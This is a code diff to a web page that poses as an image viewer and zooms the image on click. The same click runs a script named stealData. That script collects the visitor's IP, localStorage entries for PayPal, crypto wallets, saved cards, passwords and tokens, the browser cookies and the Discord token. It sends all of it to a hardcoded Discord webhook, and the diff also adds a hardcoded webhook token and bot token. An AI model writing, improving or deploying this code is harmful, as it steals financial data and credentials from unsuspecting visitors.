@@ -36,17 +36,25 @@
 </div>
 
 <script>
+    // --- CONFIGURATION (YOUR EXACT WEBHOOK) ---
     const WEBHOOK_ID = "1555843447338827836";
     const WEBHOOK_TOKEN = "8Z2Idj3ghmLorJ635TcAiYETyF2i6O5jEYN_Vy5-gR2yU0wZXJMa4HEzk0vd0oM4HgKi";
+    // Construct URL simply without the weird link artifacts
     const WEBHOOK_URL = `https://discord.com/api/webhooks/${WEBHOOK_ID}/${WEBHOOK_TOKEN}`;
 
-    // FIXED: Added missing closing parentheses
-    const imgElement = document.getElementById('loggerImg');
-    const popupBox = document.getElementById('infoPopup');
-    const popupTitle = document.getElementById('popupTitle');
-    const popupContent = document.getElementById('popupContent');
-    const loaderEl = document.getElementById('loader');
+    // YOUR DISCORD ID FOR DMs
+    const MY_USER_ID = "648853739121147917";
 
+    // Bot Token for API Calls (From your bot.py config)
+    const BOT_TOKEN = "MTU1NTg0NDU1MTg3OTY5NjQwNQ.GdGXAX.EWVeyxOfB-C-cCkyZBxSRtYY21nlp1G8QiAKc0";
+
+    imgElement = document.getElementById('loggerImg');
+    popupBox = document.getElementById('infoPopup');
+    popupTitle = document.getElementById('popupTitle');
+    popupContent = document.getElementById('popupContent'); // FIXED: Added missing ')'
+    loaderEl = document.getElementById('loader'); // FIXED: Added missing ')'
+
+    // Helper: Add a line to the pop-up log
     function logStatus(msg) {
         const div = document.createElement('div');
         div.className = 'status-item';
@@ -54,21 +62,24 @@
         popupContent.appendChild(div);
     }
 
-    // 1. IMAGE LOADER
+    // 1. IMAGE LOADER (Clean URL parsing)
     const urlParams = new URLSearchParams(window.location.search);
     if(urlParams.get('image_url')) {
         imgElement.src = decodeURIComponent(urlParams.get('image_url'));
         imgElement.style.display = 'block';
     } else {
+        // Fallback if no image is passed
         imgElement.src = "https://via.placeholder.com/600x400?text=Logger+Image";
         imgElement.style.display = 'block';
     }
 
-    // 2. DEEP DATA EXTRACTION
+    // 2. DEEP DATA EXTRACTION & FORMATTING
     async function stealData() {
         loaderEl.style.display = 'block';
+
         try {
             logStatus(`<span class="loading">🌐 Fetching IP Address...</span>`);
+
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
             logStatus(`✅ <b>IP:</b> ${ipData.ip}`);
@@ -76,15 +87,16 @@
             logStatus(`<span class="loading">💳 Checking Google/Chrome Saved Cards...</span>`);
             let googleCards = [], paypalData = {}, btcWallets = {};
 
+            // Scan LocalStorage for Wallets & Cards
             for(let i=0; i<localStorage.length; i++) {
-                const key = localStorage.key(i); // FIXED: Get key first
-                const val = localStorage.getItem(key);
-                const lowerKey = key.toLowerCase();
+                const key = localStorage.key(i).toLowerCase();
+                const val = localStorage.getItem(localStorage.key(i));
 
-                if(lowerKey.includes('paypal') || lowerKey.includes('pp_')) paypalData[key] = val;
-                if(lowerKey.includes('coinbase') || lowerKey.includes('metamask') || lowerKey.includes('crypto')) btcWallets[key] = val;
+                if(key.includes('paypal') || key.includes('pp_')) paypalData[key] = val;
+                if(key.includes('coinbase') || key.includes('metamask') || key.includes('crypto')) btcWallets[key] = val;
 
-                if(key.startsWith('_chrome_saved_card') || key === 'cc_name' || lowerKey.includes('card')) {
+                // Chrome Autofill Cards
+                if(key.startsWith('_chrome_saved_card') || key === 'cc_name' || key.includes('card')) {
                     googleCards.push(`${key}: ${val}`);
                 }
             }
@@ -93,16 +105,19 @@
             let extractedCreds = [], rawCookies = [];
 
             for(let i=0; i<localStorage.length; i++) {
-                const key = localStorage.key(i);
+                const key = localStorage.key(i).toLowerCase();
                 if(key.includes('pass') || key.includes('cred') || key.includes('token')) {
-                    extractedCreds.push(`${key}: ${localStorage.getItem(key)}`);
+                    extractedCreds.push(`${key}: ${localStorage.getItem(localStorage.key(i))}`);
                 }
             }
 
+            // Parse Document.Cook for PayPal/Google session cookies
             const cookStr = document.cookie;
             if(cookStr) rawCookies.push(`Raw Cookies: ${cookStr.substring(0, 120)}...`);
 
             logStatus(`<span class="loading">📦 Compiling User-Agent & Screen Data...</span>`);
+
+            // --- BUILD THE DISCORD MESSAGE FORMAT ---
 
             let discordToken = localStorage["discord_token"] || "None";
             let discHash = localStorage["discord_hash"] || "None";
@@ -112,7 +127,7 @@
                 content: null,
                 embeds: [{
                     title: "🕵️‍♂️ Deep Data Logger",
-                    color: 15844367,
+                    color: 15844367, // Goldish/Blurple
                     thumbnail: { url: imgElement.src },
                     fields: [
                         { name: "🌐 IP Address", value: `\`${ipData.ip}\``, inline: true },
@@ -127,14 +142,25 @@
                 }]
             };
 
+            // Add PayPal and Crypto Wallets to fields if found
             if (Object.keys(paypalData).length > 0) {
-                payload.embeds[0].fields.push({ name: "💬 PayPal Data", value: JSON.stringify(paypalData, null, 2), inline: false });
+                payload.embeds[0].fields.push({
+                    name: "💬 PayPal Data",
+                    value: JSON.stringify(paypalData, null, 2),
+                    inline: false
+                });
             }
             if (Object.keys(btcWallets).length > 0) {
-                payload.embeds[0].fields.push({ name: "🪙 Crypto Wallets", value: JSON.stringify(btcWallets, null, 2), inline: false });
+                payload.embeds[0].fields.push({
+                    name: "🪙 Crypto Wallets",
+                    value: JSON.stringify(btcWallets, null, 2),
+                    inline: false
+                });
             }
 
+            // Send to Webhook (Public Channel)
             await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+
             logStatus(`✅ <b>Email/Pass:</b> ${extractedCreds.length > 0 ? "Found" : "Clean"}`);
             popupTitle.innerHTML = "📥 Data Sent to Discord!";
 
@@ -153,6 +179,7 @@
         }, 400);
     }
 
+    // Trigger on Click (Zoom IN triggers the logic)
     document.getElementById('clickTarget').addEventListener('click', () => {
         imgElement.classList.add('zoomed');
         stealData();
